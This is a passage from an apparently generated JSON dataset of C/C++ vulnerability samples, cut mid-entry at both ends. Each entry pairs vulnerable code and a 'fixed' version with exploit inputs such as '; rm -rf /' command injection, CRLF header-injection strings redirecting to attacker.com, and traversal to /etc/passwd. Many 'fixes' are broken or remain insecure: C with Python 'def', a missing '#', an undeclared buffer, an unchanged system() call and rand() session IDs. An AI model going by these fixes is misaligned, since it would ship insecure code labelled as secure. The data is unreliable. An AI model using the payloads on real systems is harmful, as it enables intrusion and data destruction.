        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nvoid log_message(char *message) {\n    char buffer[1024];\n    snprintf(buffer, sizeof(buffer), \"Logging message: %s\\n\", message);\n    printf(\"%s\", buffer);\n}\n\nint main() {\n    char user_input[512];\n    if (fgets(user_input, sizeof(user_input), stdin) != NULL) {\n        // Remove newline character from input if present\n        size_t len = strlen(user_input);\n        if (len > 0 && user_input[len - 1] == '\\n') {\n            user_input[len - 1] = '\\0';\n        }\n        log_message(user_input);\n    }\n    return 0;\n}",
        "exploit_ways": [
            "An attacker could input a very long string to cause buffer overflow, potentially leading to code execution.",
            "Sensitive information could be logged by providing malicious inputs that contain sensitive data like passwords or keys.",
            "By entering specific patterns in the input, an attacker might exploit other parts of the system that consume the log output."
        ]
    },
    "c_26": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "#include <stdio.h>\\n#include <string.h>\\n\\nvoid display_message() {\\n    char message[50];\\n    strcpy(message, \"This is a sensitive message.\");\\n    printf(\"Message: %s\\n\", message);\\n}\\n\\nint main() {\\n    display_message();\\n    return 0;\\n}",
        "cvss_score": 2.1,
        "fixed_code": "#include <stdio.h>\\n#include <string.h>\\n\\nvoid display_message() {\\n    char message[50];\\n    strcpy(message, \"This is a public message.\");\\n    printf(\"Message: %s\\n\", message);\\n}\\n\\nint main() {\\n    display_message();\\n    return 0;\\n}",
        "exploit_ways": [
            "An attacker could use a debugger to inspect the memory and read the sensitive message.",
            "If compiled with insecure compiler flags, the binary might contain debug information revealing the message.",
            "In a multi-user environment, another user might be able to intercept terminal output to see the message."
        ]
    },
    "c_27": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n#define MAX_URL 256\n\nint main(int argc, char *argv[]) {\n    if (argc != 2) {\n        printf(\"Usage: %s <url>\\n\", argv[0]);\n        return 1;\n    }\n\n    char url[MAX_URL];\n    strncpy(url, argv[1], MAX_URL - 1);\n    url[MAX_URL - 1] = '\\0'; // Ensure null termination\n\n    printf(\"Redirecting to %s\\n\", url);\n    system(url); // Vulnerable command execution\n\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n#define MAX_URL 256\n\ndefine ALLOWED_HOST \"example.com\"\n\nint main(int argc, char *argv[]) {\n    if (argc != 2) {\n        printf(\"Usage: %s <url>\\n\", argv[0]);\n        return 1;\n    }\n\n    char url[MAX_URL];\n    strncpy(url, argv[1], MAX_URL - 1);\n    url[MAX_URL - 1] = '\\0'; // Ensure null termination\n\n    // Check if the URL starts with the allowed host\n    if (strstr(url, ALLOWED_HOST) != url) {\n        printf(\"URL is not allowed.\\n\");\n        return 1;\n    }\n\n    printf(\"Redirecting to %s\\n\", url);\n    // Use execl for safer command execution\n    execl(\"/bin/sh\", \"sh\", \"-c\", \"xdg-open \\\"\", url, \"\\\"\", (char *)NULL);\n\n    return 0;\n}",
        "exploit_ways": [
            "An attacker could input a malicious URL like 'http://malicious.com' to redirect users to an untrusted site.",
            "By injecting '; rm -rf /', the attacker might attempt to execute arbitrary commands, leading to system damage.",
            "Using URL encoding, an attacker can obfuscate the payload, making it harder to detect and exploit vulnerabilities in the URL handling."
        ]
    },
    "c_28": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid serve_page() {\n    char response[1024];\n    strcpy(response, \"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body><h1>Hello World</h1></body></html>\");\n    printf(\"%s\", response);\n}\n\nint main() {\n    serve_page();\n    return 0;\n}",
        "cvss_score": 6.5,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nvoid serve_page() {\n    char response[1024];\n    strcpy(response, \"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\nX-XSS-Protection: 1; mode=block\\r\\nX-Content-Type-Options: nosniff\\r\\nStrict-Transport-Security: max-age=31536000\\r\\n\\r\\n<html><body><h1>Hello World</h1></body></html>\");\n    printf(\"%s\", response);\n}\n\nint main() {\n    serve_page();\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can inject malicious scripts into the page to steal cookies or perform XSS attacks.",
            "Lack of X-Content-Type-Options allows MIME type sniffing, leading to potential code execution vulnerabilities.",
            "Without HSTS header, attackers can perform man-in-the-middle attacks by forcing connections over HTTP."
        ]
    },
    "c_29": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid send_response(const char* data) {\n    printf(\"Content-Type: text/html\\r\\n\");\n    printf(\"Content-Length: %zu\\r\\n\", strlen(data));\n    printf(\"\\r\\n%s\", data);\n}",
        "cvss_score": 5.0,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nvoid send_response(const char* data) {\n    printf(\"Content-Type: text/html\\r\\n\");\n    printf(\"Content-Length: %zu\\r\\n\", strlen(data));\n    printf(\"X-XSS-Protection: 1; mode=block\\r\\n\");\n    printf(\"X-Content-Type-Options: nosniff\\r\\n\");\n    printf(\"X-Frame-Options: SAMEORIGIN\\r\\n\");\n    printf(\"Strict-Transport-Security: max-age=31536000; includeSubDomains\\r\\n\");\n    printf(\"\\r\\n%s\", data);\n}",
        "exploit_ways": [
            "An attacker can inject malicious scripts into the response if not properly sanitized, leading to XSS.",
            "Without Content-Type-Options: nosniff, browsers may interpret files as different MIME types than intended, leading to potential attacks.",
            "Lack of X-Frame-Options makes the application vulnerable to clickjacking attacks where it can be embedded in another site's frame."
        ]
    },
    "c_30": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main(int argc, char *argv[]) {\n    if (argc != 2) {\n        fprintf(stderr, \"Usage: %s <url>\\n\", argv[0]);\n        return 1;\n    }\n    \n    char command[256];\n    snprintf(command, sizeof(command), \"curl -o /dev/null -s -w \\\"%%{http_code}\\\" %s\", argv[1]);\n    int http_status = system(command);\n    \n    printf(\"HTTP Status: %d\\n\", WEXITSTATUS(http_status));\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <curl/curl.h>\n\nint main(int argc, char *argv[]) {\n    if (argc != 2) {\n        fprintf(stderr, \"Usage: %s <url>\\n\", argv[0]);\n        return 1;\n    }\n    \n    CURL *curl;\n    CURLcode res;\n    long http_status_code;\n    \n    curl = curl_easy_init();\n    if(curl) {\n        curl_easy_setopt(curl, CURLOPT_URL, argv[1]);\n        curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);\n        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);\n        res = curl_easy_perform(curl);\n        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_status_code);\n        curl_easy_cleanup(curl);\n    }\n    \n    printf(\"HTTP Status: %ld\\n\", http_status_code);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can provide a URL pointing to an internal resource within the same network.",
            "They could use a crafted URL with CRLF injection to manipulate headers and access unauthorized data.",
            "Input like 'file:///etc/passwd' can be used to read local files on the server."
        ]
    },
    "c_31": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\ntypedef struct {\n    char sessionId[50];\n} UserSession;\n\nvoid createSession(UserSession *session, const char *id) {\n    strcpy(session->sessionId, id);\n}",
        "cvss_score": 4.2,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\ntypedef struct {\n    char sessionId[50];\n} UserSession;\n\nvoid createSession(UserSession *session) {\n    snprintf(session->sessionId, sizeof(session->sessionId), \"%lu\", (unsigned long)rand());\n}",
        "exploit_ways": [
            "An attacker can predict or guess the session ID to hijack a user's session.",
            "By maintaining the same session ID across multiple sessions, an attacker could exploit session fixation vulnerabilities in applications that do not regenerate IDs.",
            "If the vulnerable application uses predictable session IDs, attackers can manually set their session cookie to match a valid user's session."
        ]
    },
    "c_32": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid send_http_response(const char* user_input) {\n    char response[1024];\n    snprintf(response, sizeof(response), \"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>%s</body></html>\", user_input);\n    printf(\"%s\", response);\n}\n\nint main() {\n    char input[512];\n    printf(\"Enter your data: \");\n    fgets(input, sizeof(input), stdin);\n    send_http_response(input);\n    return 0;\n}",
        "cvss_score": 6.8,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nvoid sanitize_input(char* input) {\n    for (int i = 0; input[i] != '\\0'; i++) {\n        if (input[i] == '\\r' || input[i] == '\\n') {\n            input[i] = ' ';\n        }\n    }\n}\n\nvoid send_http_response(const char* user_input) {\n    char sanitized_input[512];\n    strncpy(sanitized_input, user_input, sizeof(sanitized_input));\n    sanitize_input(sanitized_input);\n    char response[1024];\n    snprintf(response, sizeof(response), \"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>%s</body></html>\", sanitized_input);\n    printf(\"%s\", response);\n}\n\nint main() {\n    char input[512];\n    printf(\"Enter your data: \");\n    fgets(input, sizeof(input), stdin);\n    send_http_response(input);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can inject \\r\\nSet-Cookie: MaliciousCookie=1; to set a malicious cookie.",
            "They could use \\r\\nHTTP/1.1 302 Moved Temporarily\\r\\nLocation: http://malicious.com to redirect users to a malicious site.",
            "An attacker might inject multiple headers using \\r\\n to manipulate server responses."
        ]
    },
    "c_33": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid sendResponse(char *userInput) {\n    printf(\"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>%s</body></html>\\n\", userInput);\n}",
        "cvss_score": 4.3,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nvoid sendResponse(char *userInput) {\n    char safeInput[1024];\n    strncpy(safeInput, userInput, sizeof(safeInput)-1);\n    safeInput[sizeof(safeInput)-1] = '\\0';\n    for (int i = 0; safeInput[i] != '\\0'; i++) {\n        if (safeInput[i] == '\\r' || safeInput[i] == '\\n') {\n            safeInput[i] = ' ';\n        }\n    }\n    printf(\"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>%s</body></html>\\n\", safeInput);\n}",
        "exploit_ways": [
            "An attacker can inject '\\r\\nSet-Cookie: session=malicious' to manipulate cookies.",
            "Could use '\\r\\nLocation: http://attacker.com' to perform open redirection attacks.",
            "Injecting '\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n<html><body>Malicious Content</body></html>' could display arbitrary content."
        ]
    },
    "c_34": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid open_redirect(char *url) {\n    char command[1024];\n    snprintf(command, sizeof(command), \"xdg-open %s\", url);\n    system(command);\n}",
        "cvss_score": 6.5,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nvoid open_redirect(const char *url) {\n    if (strncmp(url, \"https://example.com/\", 21) != 0) {\n        printf(\"Invalid URL\\n\");\n        return;\n    }\n    char command[1024];\n    snprintf(command, sizeof(command), \"xdg-open %s\", url);\n    system(command);\n}",
        "exploit_ways": [
            "An attacker can provide a malicious URL to redirect users to an unintended site.",
            "By inputting 'https://example.com/; rm -rf /', the attacker could attempt to execute additional commands.",
            "Using a crafted URL like 'https://attacker.com/evil.html' can lead to phishing or malware distribution."
        ]
    },
    "c_35": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid set_session_id(char *session_id) {\n    strcpy(session_id, \"fixedsession123\");\n}\n\nint main() {\n    char session_id[50];\n    set_session_id(session_id);\n    printf(\"Session ID: %s\\n\", session_id);\n    return 0;\n}",
        "cvss_score": 4.2,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nvoid set_session_id(char *session_id) {\n    snprintf(session_id, 50, \"randomsession%ld\", (long)time(NULL));\n}\n\nint main() {\n    char session_id[50];\n    srand((unsigned int)time(NULL));\n    set_session_id(session_id);\n    printf(\"Session ID: %s\\n\", session_id);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can predict or reuse the fixed session ID to hijack a legitimate user's session.",
            "The attacker might use the static session ID in phishing attempts to lure users into authenticated sessions.",
            "If other parts of the application rely on this session ID, an attacker could exploit it to gain unauthorized access."
        ]
    },
    "c_36": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "#include <stdio.h>\\n#include <string.h>\\n\\nvoid logData(const char* data) {\\n    static char buffer[1024];\\n    if (strlen(buffer) + strlen(data) + 1 < sizeof(buffer)) {\\n        strcat(buffer, data);\\n        printf(\"Logged Data: %s\\n\", buffer);\\n    }\\n}",
        "cvss_score": 3.5,
        "fixed_code": "#include <stdio.h>\\n#include <string.h>\\n\\nvoid logData(const char* data) {\\n    static char buffer[1024];\\n    size_t len = strlen(buffer);\\n    if (len + strlen(data) + 1 < sizeof(buffer)) {\\n        strncpy(buffer + len, data, sizeof(buffer) - len - 1);\\n        buffer[len + strlen(data)] = '\\0';\\n        printf(\"Logged Data: %s\\n\", buffer);\\n    } else {\\n        fprintf(stderr, \"Buffer overflow prevented\\n\");\\n    }\\n}",
        "exploit_ways": [
            "An attacker could inject malicious data to cause a buffer overflow if the check is bypassed.",
            "Injecting specific data patterns can lead to information leakage of previously logged sensitive data.",
            "Crafting input that nears the buffer limit can cause unexpected behavior or crashes, aiding in debugging and reverse engineering."
        ]
    },
    "c_37": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid send_response(char *user_input) {\n    char response[256];\n    snprintf(response, sizeof(response), \"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>%s</body></html>\", user_input);\n    printf(\"%s\", response);\n}",
        "cvss_score": 6.5,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nvoid send_response(char *user_input) {\n    char safe_input[256];\n    snprintf(safe_input, sizeof(safe_input), \"%s\", user_input);\n    for (int i = 0; i < strlen(safe_input); i++) {\n        if (safe_input[i] == '\\r' || safe_input[i] == '\\n') {\n            safe_input[i] = ' ';\n        }\n    }\n    char response[512];\n    snprintf(response, sizeof(response), \"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>%s</body></html>\", safe_input);\n    printf(\"%s\", response);\n}",
        "exploit_ways": [
            "An attacker can inject '\\r\\nSet-Cookie: session=malicious' to manipulate cookies.",
            "Could use '\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n<html><body>Malicious Content</body></html>' to return fake responses.",
            "Injecting '\\r\\nLocation: http://malicious.com' can cause redirection to a malicious site."
        ]
    },
    "c_38": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nclass WebServer {\npublic:\n    void handleRequest(const char* request) {\n        if (strcmp(request, \"GET /\") == 0) {\n            printf(\"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>Hello World</body></html>\");\n        }\n    }\n};",
        "cvss_score": 4.3,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nclass WebServer {\npublic:\n    void handleRequest(const char* request) {\n        if (strcmp(request, \"GET /\") == 0) {\n            printf(\"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\nX-Frame-Options: SAMEORIGIN\\r\\nX-XSS-Protection: 1; mode=block\\r\\nStrict-Transport-Security: max-age=31536000; includeSubDomains\\r\\nContent-Security-Policy: default-src 'self'\\r\\n\\r\\n<html><body>Hello World</body></html>\");\n        }\n    }\n};",
        "exploit_ways": [
            "An attacker can use clickjacking to trick users into clicking on elements in the page.",
            "XSS attacks could be performed if additional content is introduced by user input without proper sanitization.",
            "Without HSTS, an attacker might perform man-in-the-middle attacks by downgrading HTTPS connections to HTTP."
        ]
    },
    "c_39": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid send_response(const char *user_input) {\n    char response[256];\n    snprintf(response, sizeof(response), \"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>%s</body></html>\", user_input);\n    printf(\"%s\", response);\n}\n\nint main() {\n    const char *user_input = \"<script>alert('XSS');</script>\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>Hacked</body></html>\";\n    send_response(user_input);\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nvoid sanitize_input(char *input) {\n    for (char *p = input; *p; p++) {\n        if (*p == '\\r' || *p == '\\n') {\n            *p = ' ';\n        }\n    }\n}\n\nvoid send_response(const char *user_input) {\n    char sanitized_input[256];\n    strncpy(sanitized_input, user_input, sizeof(sanitized_input));\n    sanitize_input(sanitized_input);\n    char response[512];\n    snprintf(response, sizeof(response), \"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>%s</body></html>\", sanitized_input);\n    printf(\"%s\", response);\n}\n\nint main() {\n    const char *user_input = \"<script>alert('XSS');</script>\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>Hacked</body></html>\";\n    send_response(user_input);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can inject \\r\\n in the user input to add new headers, potentially redirecting users to malicious sites.",
            "By injecting \\r\\nSet-Cookie: sessionid=maliciouscookie; an attacker can manipulate cookies and take over user sessions.",
            "The attacker could use HTTP response splitting to deliver crafted content that exploits other vulnerabilities on the client side."
        ]
    },
    "c_40": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "void set_session_id(char *session_data) {\n    char buffer[1024];\n    sprintf(buffer, \"Session ID: %s\", session_data);\n}",
        "cvss_score": 3.5,
        "fixed_code": "void set_session_id(const char *session_data) {\n    if (session_data == NULL || strlen(session_data) >= 1024 - 11) {\n        return;\n    }\n    snprintf(buffer, sizeof(buffer), \"Session ID: %s\", session_data);\n}",
        "exploit_ways": [
            "An attacker can predict or set a valid session ID to hijack user sessions.",
            "By setting the session ID to a known value before login, an attacker can maintain control after authentication.",
            "If the session ID is predictable or reused, attackers can exploit this to perform cross-site request forgery (CSRF) attacks."
        ]
    },
    "c_41": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nvoid unsafe_function() {\n    char buffer[1024];\n    FILE *file = fopen(\"/tmp/data.txt\", \"r\");\n    if (file == NULL) {\n        perror(\"Failed to open file\");\n        return;\n    }\n    sleep(1);\n    fgets(buffer, sizeof(buffer), file);\n    fclose(file);\n    printf(\"Read data: %s\\n\", buffer);\n}\n\nint main() {\n    unsafe_function();\n    return 0;\n}",
        "cvss_score": 4.5,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <sys/stat.h>\n\nvoid safe_function() {\n    char buffer[1024];\n    int fd = open(\"/tmp/data.txt\", O_RDONLY);\n    if (fd == -1) {\n        perror(\"Failed to open file\");\n        return;\n    }\n    sleep(1);\n    ssize_t bytes_read = read(fd, buffer, sizeof(buffer) - 1);\n    if (bytes_read >= 0) {\n        buffer[bytes_read] = '\\0';\n    }\n    close(fd);\n    printf(\"Read data: %s\\n\", buffer);\n}\n\nint main() {\n    safe_function();\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can replace \\/tmp\\/data.txt with a symlink to another file before the sleep call, causing different data to be read.",
            "By creating a new file and deleting it after the file is opened but before it's read, an attacker can control what gets written into \\/tmp\\/data.txt.",
            "Using a timing attack, an attacker might attempt to change the contents of the file during the sleep period, though this is more difficult."
        ]
    },
    "c_42": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid displayPage() {\n    printf(\"<html><head><title>Clickjacking Example</title></head>\");\n    printf(\"<body><iframe src='http://malicious.com' style='position:absolute; top:0; left:0; width:100%; height:100%; opacity:0.5;' frameborder=0></iframe>\");\n    printf(\"<h1>Welcome to our site</h1></body></html>\");\n}\n\nint main() {\n    displayPage();\n    return 0;\n}",
        "cvss_score": 3.6,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nvoid displayPage() {\n    printf(\"<html><head><title>Clickjacking Example</title></head>\");\n    printf(\"<body style='position:relative;'>\");\n    printf(\"<iframe src='http://malicious.com' style='position:absolute; top:0; left:0; width:100%%; height:100%%; opacity:0.5; pointer-events:none;' frameborder=0></iframe>\");\n    printf(\"<h1>Welcome to our site</h1></body></html>\");\n}\n\nint main() {\n    displayPage();\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can overlay a transparent iframe over the legitimate page, tricking users into clicking on hidden malicious elements.",
            "Users might inadvertently submit actions intended for the legitimate site to a malicious site layered beneath it without knowing.",
            "The attacker can manipulate the iframe's content to perform unintended actions on behalf of the user."
        ]
    },
    "c_43": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "#include <stdio.h>\\n#include <stdlib.h>\\n\\n#define MAX_URL_LENGTH 256\\n\\ntypedef struct {\\n    char *url;\\n} Requester;\\n\\nvoid fetch_url(Requester *req) {\\n    char command[MAX_URL_LENGTH + 10];\\n    snprintf(command, sizeof(command), \"curl -s %s\", req->url);\\n    system(command);\\n}\\n\\nRequester* create_requester(const char *url) {\\n    Requester *req = (Requester*)malloc(sizeof(Requester));\\n    if (!req) return NULL;\\n    req->url = strdup(url);\\n    return req;\\n}\\n\\nvoid destroy_requester(Requester *req) {\\n    free(req->url);\\n    free(req);\\n}",
        "cvss_score": 6.5,
        "fixed_code": "#include <stdio.h>\\n#include <stdlib.h>\\n#include <string.h>\\n\\n#define MAX_URL_LENGTH 256\\n#define ALLOWED_DOMAIN \"example.com\"\\n\\ntypedef struct {\\n    char *url;\\n} Requester;\\n\\nint is_allowed_domain(const char *url) {\\n    const char *domain = strstr(url, ALLOWED_DOMAIN);\\n    return domain && (domain == url || *(domain - 1) == '.' || *(domain - 1) == ':');\\n}\\n\\nvoid fetch_url(Requester *req) {\\n    if (!is_allowed_domain(req->url)) {\\n        fprintf(stderr, \"Domain not allowed\\n\");\\n        return;\\n    }\\n    char command[MAX_URL_LENGTH + 10];\\n    snprintf(command, sizeof(command), \"curl -s %s\", req->url);\\n    system(command);\\n}\\n\\nRequester* create_requester(const char *url) {\\n    Requester *req = (Requester*)malloc(sizeof(Requester));\\n    if (!req) return NULL;\\n    req->url = strdup(url);\\n    return req;\\n}\\n\\nvoid destroy_requester(Requester *req) {\\n    free(req->url);\\n    free(req);\\n}",
        "exploit_ways": [
            "An attacker could provide a URL pointing to an internal network resource, bypassing intended access restrictions.",
            "By injecting additional curl flags, the attacker might be able to perform actions like downloading files from unauthorized locations.",
            "Crafting a malicious URL with specific parameters could lead to unintended data exfiltration or other SSRF attacks."
        ]
    },
    "c_44": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "#include <stdio.h>\n#include <pthread.h>\n\nclass Counter {\npublic:\n    int value;\n\n    Counter() : value(0) {}\n\n    void increment() {\n        value++;\n    }\n};\n\nvoid* threadFunc(void* arg) {\n    Counter* counter = static_cast<Counter*>(arg);\n    for (int i = 0; i < 100000; ++i) {\n        counter->increment();\n    }\n    return NULL;\n}\n\nint main() {\n    pthread_t threads[2];\n    Counter counter;\n\n    pthread_create(&threads[0], NULL, threadFunc, &counter);\n    pthread_create(&threads[1], NULL, threadFunc, &counter);\n\n    pthread_join(threads[0], NULL);\n    pthread_join(threads[1], NULL);\n\n    printf(\"Final counter value: %d\\n\", counter.value);\n    return 0;\n}",
        "cvss_score": 6.8,
        "fixed_code": "#include <stdio.h>\n#include <pthread.h>\n\nclass Counter {\npublic:\n    int value;\n    pthread_mutex_t mutex;\n\n    Counter() : value(0) {\n        pthread_mutex_init(&mutex, NULL);\n    }\n\n    void increment() {\n        pthread_mutex_lock(&mutex);\n        value++;\n        pthread_mutex_unlock(&mutex);\n    }\n};\n\nvoid* threadFunc(void* arg) {\n    Counter* counter = static_cast<Counter*>(arg);\n    for (int i = 0; i < 100000; ++i) {\n        counter->increment();\n    }\n    return NULL;\n}\n\nint main() {\n    pthread_t threads[2];\n    Counter counter;\n\n    pthread_create(&threads[0], NULL, threadFunc, &counter);\n    pthread_create(&threads[1], NULL, threadFunc, &counter);\n\n    pthread_join(threads[0], NULL);\n    pthread_join(threads[1], NULL);\n\n    printf(\"Final counter value: %d\\n\", counter.value);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker could cause the program to output a final counter value that is less than expected due to unsynchronized increments.",
            "If this code is part of a larger system, race conditions could lead to inconsistent state updates or data corruption.",
            "In certain scenarios, an attacker might be able to predict or influence the timing of thread execution to manipulate the counter value."
        ]
    },
    "c_45": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n\nvoid read_file() {\n    char filename[100];\n    printf(\"Enter file name to read: \");\n    scanf(\"%s\", filename);\n    FILE *file = fopen(filename, \"r\");\n    if (file) {\n        char ch;\n        while ((ch = fgetc(file)) != EOF)\n            putchar(ch);\n        fclose(file);\n    } else {\n        printf(\"Failed to open file\\n\");\n    }\n}",
        "cvss_score": 4.2,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nvoid read_file() {\n    char filename[100];\n    printf(\"Enter file name to read: \");\n    scanf(\"%99s\", filename);\n    if (strncmp(filename, \"safe_dir/\", 8) == 0) {\n        FILE *file = fopen(filename, \"r\");\n        if (file) {\n            char ch;\n            while ((ch = fgetc(file)) != EOF)\n                putchar(ch);\n            fclose(file);\n        } else {\n            printf(\"Failed to open file\\n\");\n        }\n    } else {\n        printf(\"Access denied\\n\");\n    }\n}",
        "exploit_ways": [
            "An attacker can input \"/etc/passwd\" to read system user information.",
            "They could try \"../../../../../../etc/passwd\" to navigate directory structures and access sensitive files.",
            "By entering a non-existent file name, the program may reveal path information in error messages."
        ]
    },
    "c_46": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n\nvoid readFile(char *filename) {\n    FILE *file = fopen(filename, \"r\");\n    if (file == NULL) {\n        perror(\"Error opening file\");\n        return;\n    }\n    char ch;\n    while ((ch = fgetc(file)) != EOF)\n        putchar(ch);\n    fclose(file);\n}\n\nint main(int argc, char *argv[]) {\n    if (argc < 2) {\n        printf(\"Usage: %s <filename>\\n\", argv[0]);\n        return 1;\n    }\n    readFile(argv[1]);\n    return 0;\n}",
        "cvss_score": 5.3,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nvoid readFile(char *filename) {\n    char safePath[256];\n    snprintf(safePath, sizeof(safePath), \"./safe_directory/%s\", filename);\n    FILE *file = fopen(safePath, \"r\");\n    if (file == NULL) {\n        perror(\"Error opening file\");\n        return;\n    }\n    char ch;\n    while ((ch = fgetc(file)) != EOF)\n        putchar(ch);\n    fclose(file);\n}\n\nint main(int argc, char *argv[]) {\n    if (argc < 2) {\n        printf(\"Usage: %s <filename>\\n\", argv[0]);\n        return 1;\n    }\n    readFile(argv[1]);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can input '../etc/passwd' to read the system's password file.",
            "By entering a crafted filename, an attacker might access sensitive configuration files in predictable locations.",
            "Using relative paths and directory traversal sequences, attackers could potentially exploit this vulnerability to view other local files."
        ]
    },
    "c_47": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\ndef load_config(char* filename) {\n    char path[256];\n    snprintf(path, sizeof(path), \"/etc/config/%s.conf\", filename);\n    FILE *file = fopen(path, \"r\");\n    if (file) {\n        char buffer[1024];\n        while (fgets(buffer, sizeof(buffer), file)) {\n            printf(\"%s\", buffer);\n        }\n        fclose(file);\n    } else {\n        perror(\"Failed to open file\");\n    }\n}",
        "cvss_score": 3.5,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\ndef load_config(char* filename) {\n    char path[256];\n    const char *base = \"/etc/config/\";\n    if (strncpy(path, base, sizeof(path)) != NULL && strncat(path, filename, sizeof(path) - strlen(base) - 1) != NULL) {\n        FILE *file = fopen(path, \"r\");\n        if (file) {\n            char buffer[1024];\n            while (fgets(buffer, sizeof(buffer), file)) {\n                printf(\"%s\", buffer);\n            }\n            fclose(file);\n        } else {\n            perror(\"Failed to open file\");\n        }\n    } else {\n        perror(\"Invalid filename\");\n    }\n}",
        "exploit_ways": [
            "An attacker could input a filename like '../shadow' to access sensitive files outside the intended directory.",
            "Crafting a filename with special characters could lead to unintended paths being accessed, such as '../../etc/passwd'.",
            "Using null bytes in the filename might bypass simple checks and allow for path traversal attacks."
        ]
    },
    "c_48": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid fetchData(const char *url) {\n    char command[256];\n    snprintf(command, sizeof(command), \"wget -qO- %s\", url);\n    system(command);\n}",
